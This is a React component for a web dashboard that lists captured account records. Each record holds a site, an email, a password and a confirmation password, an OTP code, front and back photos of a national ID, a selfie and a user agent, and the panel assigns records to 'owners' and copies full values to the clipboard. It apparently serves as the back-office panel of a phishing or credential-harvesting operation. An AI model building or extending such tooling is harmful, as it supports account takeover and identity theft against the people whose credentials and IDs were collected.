import Table from "./Table.jsx";
import { useEffect, useState } from "react";
import request from '../utils/request.js';
import { ACCOUNT_INFORMATION } from "../utils/api-endpoint.js";
import Section from "./Section.jsx";
import Processing from "./Processing.jsx";
import ShowDataIfFound from "./ShowDataIfFound.jsx";
import Action from "./Action.jsx";
import { routes } from "../routes/index.js";
import { successToast } from "../utils/toasts/index.js";
import BadgeLarge from "./BadgeLarge.jsx";
import Badge from "./Badge.jsx";
import { DocumentDuplicateIcon, EyeIcon } from "@heroicons/react/24/solid/index.js";
import Button from "./Button.jsx";
import DefaultTooltip from "./DefaultTooltip.jsx";
import ClipboardData from "./ClipboardData.jsx";
import Modal from "./Modal.jsx";
import Pagination from "./Pagination.jsx";
import InnerSection from "./InnerSection.jsx";
import TableCheckbox from "./TableCheckbox.jsx";
import { useSelector } from "react-redux";
import { cn, handleMultipleDelete } from "../utils/index.js";
import AccountPhotoGroup from "./AccountPhotoGroup.jsx";

const AccountInfo = ({ heading, isForDashboard = false, tableColumns }) => {
  const authUser = useSelector(state => state.auth.user);
  const [accounts, setAccounts] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [currentAccount, setCurrentAccount] = useState(null);
  const [currentPage, setCurrentPage] = useState(1);
  const [tableColumnData, setTableColumnData] = useState(tableColumns);

  const fetchAccounts = async (page) => {
    setIsProcessing(true);
    try {
      const { data } = await request.get(`${ACCOUNT_INFORMATION}?page=${page}`);
      setAccounts(data);
    } catch (error) {
      console.error('Error fetching accounts:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleDelete = async (accountId) => {
    setIsProcessing(true);
    try {
      const { data } = await request.delete(`${ACCOUNT_INFORMATION}/${accountId}`);
      successToast(data.success);
      await pageRefresh();
    } catch (error) {
      console.error('Error deleting account:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  const pageRefresh = async () => {
    await fetchAccounts(currentPage);
  };

  const viewNid = (account) => {
    setCurrentAccount(account);
    document.getElementById('primary_modal').showModal();
  };

  const modalDismiss = () => {
    setCurrentAccount(null);
  };

  const maskEmail = (email) => {
    const [namePart, domainPart] = email.split('@');
    const maskedName = namePart.slice(0, 2) + '*****';
    const maskedDomain = domainPart.slice(domainPart.lastIndexOf('.'));
    return maskedName + maskedDomain;
  };

  const handlePagination = async (page) => {
    setCurrentPage(page);
    await fetchAccounts(page);
  };

  const handleCheckedItems = async () => {
    setIsProcessing(true)
    await handleMultipleDelete('account_information')
    await fetchAccounts(currentPage)
    setIsProcessing(false)
  }


  useEffect(() => {
    pageRefresh();
  }, []);

  useEffect(() => {
    if (authUser.is_user) {
      setTableColumnData((prevStates) => prevStates.filter(item => item.toLowerCase() !== 'action' && item.toLowerCase() !== 'owner'));
    }
  }, [authUser]);

  const renderNidModal = () => (
    <Modal modalDismiss={modalDismiss}>
      <div className='flex flex-col gap-4'>
        <div className='flex flex-col justify-center items-center gap-2'>
          <h1 className='text-xl'>NID Front :</h1>
          {currentAccount?.nid_front ? (
            <AccountPhotoGroup image={currentAccount?.nid_front}/>
          ) : (
            <Badge className='badge-warning'>N/A</Badge>
          )}
        </div>
        <div className='flex flex-col justify-center items-center gap-2'>
          <h1 className='text-xl'>NID Back :</h1>
          {currentAccount?.nid_back ? (
            <AccountPhotoGroup image={currentAccount?.nid_back}/>
          ) : (
            <Badge className='badge-warning'>N/A</Badge>
          )}
        </div>
        <div className='flex flex-col justify-center items-center gap-2'>
          <h1 className='text-xl'>Selfie :</h1>
          {currentAccount?.selfie ? (
            <AccountPhotoGroup image={currentAccount?.selfie}/>
          ) : (
            <Badge className='badge-warning'>N/A</Badge>
          )}
        </div>
      </div>
    </Modal>
  );

  return (
    <Section>
      {!isForDashboard && renderNidModal()}
      <InnerSection heading={heading} headingButton={!isForDashboard ?
        <Button className='px-16' onClick={pageRefresh}>Refresh</Button> : ''}>
        <Processing processing={isProcessing}>
          <ShowDataIfFound data={accounts?.data}>
            <Table className='table' tableColumns={tableColumnData} showDeleteButton={!isForDashboard && !authUser.is_user} handleCheckedItems={handleCheckedItems}>
              {accounts?.data?.map(account => (
                <tr key={account.id}>
                  {!isForDashboard && !authUser.is_user && (
                    <th>
                      <TableCheckbox value={account?.id} />
                    </th>
                  )}
                  {isForDashboard && <td>{account.id}</td>}
                  <td><BadgeLarge className='custom-badge uppercase'>{account?.site}</BadgeLarge></td>
                  <td>
                    <DefaultTooltip value='Copy'>
                      <ClipboardData value={account?.email}>
                        <button type='button'>{maskEmail(account?.email)}</button>
                      </ClipboardData>
                    </DefaultTooltip>
                  </td>
                  <td>
                    <DefaultTooltip value='Copy'>
                      <ClipboardData value={account?.password}>
                        <button className='text-nowrap' type='button'>{account?.password?.slice(0, 2) + '*****'}</button>
                      </ClipboardData>
                    </DefaultTooltip>
                  </td>
                  {!isForDashboard && (
                    <td>
                      {account?.confirm_password ? (
                        <DefaultTooltip value='Copy'>
                          <ClipboardData value={account?.confirm_password}>
                            <button className='text-nowrap' type='button'>{account?.confirm_password?.slice(0, 2) + '*****'}</button>
                          </ClipboardData>
                        </DefaultTooltip>
                      ) : (
                        <Badge className='badge-warning'>N/A</Badge>
                      )}
                    </td>
                  )}
                  {!isForDashboard && (
                    <td>
                      <DefaultTooltip value='View NID'>
                        <Button onClick={() => viewNid(account)} type='button' className='bg-info hover:bg-info duration-200'>
                          <EyeIcon className='size-4' />
                        </Button>
                      </DefaultTooltip>
                    </td>
                  )}
                  {!isForDashboard && (
                    <td>
                      <DefaultTooltip value='Copy'>
                        <ClipboardData value={account.user_agent}>
                          <Button type='button' className='bg-green-600 hover:bg-green-700 duration-200'>
                            <DocumentDuplicateIcon className='size-4' />
                          </Button>
                        </ClipboardData>
                      </DefaultTooltip>
                    </td>
                  )}
                  {!isForDashboard && !authUser.is_user && (
                    <td>
                      <Action editLink={false} data={account} url={routes.accountInformation} handleDelete={handleDelete} />
                    </td>
                  )}
                  {isForDashboard && (
                    <td>
                      {account?.otp_code ? (
                        <DefaultTooltip value='Copy'>
                          <ClipboardData value={account?.otp_code}>
                            <button className='text-nowrap' type='button'>{account?.otp_code?.slice(0, 2) + '*****'}</button>
                          </ClipboardData>
                        </DefaultTooltip>
                      ) : (
                        <Badge className='badge-warning'>N/A</Badge>
                      )}
                    </td>
                  )}
                  <td><p>{account?.time_for_humans}</p></td>
                  {isForDashboard && !authUser.is_user && (
                    <td>
                     <div>
                       {
                         account?.owners?.map(owner => (
                           <Badge key={owner.id} className={cn('mr-1', authUser.id === owner?.id ? 'badge-primary' : 'badge-accent')}>{owner?.name}</Badge>
                         ))
                       }
                     </div>
                    </td>
                  )}
                </tr>
              ))}
            </Table>
            <Pagination
              data={accounts}
              handlePagination={handlePagination}
              currentPage={currentPage}
            />
          </ShowDataIfFound>
        </Processing>
      </InnerSection>
    </Section>
  );
};

export default AccountInfo;
